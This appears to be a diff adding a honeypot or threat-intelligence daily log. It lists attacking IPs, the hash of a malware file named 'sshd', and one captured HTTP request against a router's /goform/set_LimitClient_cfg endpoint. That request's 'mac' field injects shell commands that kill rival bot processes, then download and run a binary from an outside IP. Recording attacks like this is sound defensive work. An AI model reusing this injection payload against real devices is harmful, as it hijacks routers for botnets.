@@ -1,0 +1,31 @@
+Top 5 IPs for 12-10-2024 :
+
+85.192.61.181
+111.67.193.216
+218.3.12.0
+45.133.251.177
+137.184.183.44
+
+Malware Observed:
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+ 
+
+Commands/exploits observed :
+
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Host: <Host IP>
+User-Agent: Linux Gnu (cow)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 240
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 mpsl; killall -9 bash.mpsl; killall -9 mips; killall -9 tsuki.mpsl; killall -9 skid.mpsl;rm -rf blink; wget http://http://108.233.83.51/blink; chmod 777 blink; ./blink blink; rm -rf blink;
